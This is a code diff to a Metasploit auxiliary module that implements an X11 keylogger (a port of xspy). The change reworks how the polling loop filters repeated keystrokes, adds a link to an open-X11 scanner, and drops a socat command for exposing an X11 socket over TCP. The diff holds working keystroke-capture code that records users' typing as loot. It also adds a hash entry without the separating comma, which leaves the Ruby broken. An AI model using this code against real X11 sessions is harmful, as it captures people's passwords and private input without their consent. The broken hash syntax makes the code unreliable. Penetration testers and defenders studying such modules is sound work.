@@ -19,12 +19,13 @@ class MetasploitModule < Msf::Auxiliary
           The module works by connecting to the X11 session, creating a background
           window, binding a keyboard to it and creating a notification alert when a key
           is pressed.
+
           One of the major limitations of xspy, and thus this module, is that it polls
-          at a very fast rate, faster than a key being pressed is released (especiall before
+          at a very fast rate, faster than a key being pressed is released (especially before
           the repeat delay is hit). To combat printing multiple characters for a single key
-          press, repeat characters arent printed. If a repeat character is pressed on the
-          keyboard, it will unfortunately be ignored.
-          socat -d -d TCP-LISTEN:6000,fork,bind=127.0.0.1 UNIX-CONNECT:/tmp/.X11-unix/X1
+          press, repeat characters arent printed when typed in a very fast manor. This is also
+          an imperfect keylogger in that keystrokes arent stored and forwarded but status
+          displayed at poll time. Keys may be repeated or missing.
         },
         'License' => MSF_LICENSE,
         'Author' => [
@@ -44,11 +45,14 @@ class MetasploitModule < Msf::Auxiliary
           'Reliability' => [],
           'SideEffects' => [],
           'AKA' => ['xspy']
+          'RelatedModules' => [
+            'auxiliary/scanner/x11/open_x11',
+          ]
         }
       )
     )
     register_options [
-      OptInt.new('ListenerTimeout', [ true, 'The maximum number of seconds to keylog', 600 ]) # 10minutes
+      OptInt.new('ListenerTimeout', [ true, 'The maximum number of seconds to keylog', 600 ]) # 10 minutes
     ]
   end
 
@@ -129,21 +133,20 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   # TBH still don't really understand exactly how this works, but it does.
-  def print_keystroke(bit_array_of_keystrokes, key_map)
+  def print_keystroke(bit_array_of_keystrokes, key_map, last_key_press_array)
     # Iterate through each byte of keyboard state
-    32.times do |i|
+    bit_array_of_keystrokes.each_with_index do |keyboard_state_byte, byte_index|
+      next if last_key_press_array[byte_index] == keyboard_state_byte
       # Check each bit within the byte
       8.times do |j|
-        next unless bit_array_of_keystrokes[i] & (1 << j) != 0
+        next unless keyboard_state_byte & (1 << j) != 0
 
         # Key at position (i*8 + j) is pressed
-        keycode = i * 8 + j
+        keycode = byte_index * 8 + j
+
         keysym = key_map[keycode]
-
-        print_line(keysym) unless @previous_character == keysym
-        @keylogger_log += keysym unless @previous_character == keysym
-
-        @previous_character = keysym
+        print_line(keysym)
+        @keylogger_log += keysym
       end
     end
   end
@@ -217,9 +220,10 @@ class MetasploitModule < Msf::Auxiliary
 
     vprint_status('(9/9) Creating local keyboard map')
     key_map = build_sym_key_map(map_data)
+    last_key_press_array = Array.new(32, 0)
+    empty = Array.new(32, 0)
 
     print_good('All setup, watching for keystrokes')
-    @previous_character = ''
     # loop mechanics stolen from exploit/multi/handler
     stime = Time.now.to_f
     timeout = datastore['ListenerTimeout'].to_i
@@ -229,28 +233,17 @@ class MetasploitModule < Msf::Auxiliary
 
         sock.put(QUERYKEYMAPREQUEST.new.to_binary_s)
         bit_array_of_keystrokes = QUERYKEYMAPREPLY.read(sock.get_once(-1, 1)).data
-
-        print_keystroke(bit_array_of_keystrokes, key_map)
-
-        # So we have a timing problem here. The c code does a 10 usec sleep via select
-        # https://gitlab.com/kalilinux/packages/xspy/-/blob/kali/master/Xspy.c?ref_type=heads#L79
-        # when we try to replicate with either ruby sleep(0.00001), orRex.sleep(0.00001), we see
-        # both give a .2 second sleep which is FAR too slow for typing, we miss about 50%
-        # of typed characters at the author's typing speed.
-        #
-        # However, no sleep gives us repeated alternating characters for whatever reason
-        # so 'the' would give ththththththe. Still working on how to get around this
-        stall_start = Time.now
-        while (Time.now - stall_start < 0.001)
-          sock.put(QUERYKEYMAPREQUEST.new.to_binary_s)
-          sock.get_once(-1, 1)
-          # don't print, we're using this to slow things down
-        end
+        # we poll FAR quicker than a normal key press, so we need to filter repeats
+        next if bit_array_of_keystrokes == last_key_press_array # skip repeats
+        
+        print_keystroke(bit_array_of_keystrokes, key_map, last_key_press_array) unless bit_array_of_keystrokes == empty
+        last_key_press_array = bit_array_of_keystrokes
       end
     ensure
       vprint_status('Closing X11 connection')
       sock.put(X11FREEGRAPHICALCONTEXTREQUEST.new(gc: connection.resource_id_base).to_binary_s +
         X11GETINPUTFOCUSREQUEST.new.to_binary_s)
+      disconnect
 
       unless @keylogger_log == ''
         loot_path = store_loot(
